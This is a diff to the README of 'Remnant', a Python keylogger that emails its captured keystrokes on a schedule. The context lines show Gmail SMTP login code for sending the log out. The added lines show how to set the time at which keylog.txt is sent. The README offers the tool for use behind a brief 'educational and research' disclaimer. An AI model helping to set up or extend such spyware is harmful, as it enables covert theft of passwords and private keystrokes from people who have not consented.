@@ -2,7 +2,7 @@
 A keylogger written in Python with scheduled emailing functionality.
 
 ## Getting Started
-There several modules that you will need to make sure are installed before you can run Remnant keylogger.
+There are several modules that you will need to make sure are installed before you can run Remnant keylogger.
 
 * datetime
 * email
@@ -47,6 +47,12 @@ server = smtplib.SMTP('smtp.gmail.com', 587)
 server.starttls()
 server.login(fromaddr, "SENDING EMAIL ACCOUNT PASSWORD")
 ```
+Set the time you want the keylog.txt file to be sent to you here:
+
+```
+y=x.replace(day=x.day+offset, hour=16, minute=30, second=0, microsecond=0)
+```
+
 
 ## Disclaimer
 This code is distributed for educational and research purposes. Do not use without a person's consent.
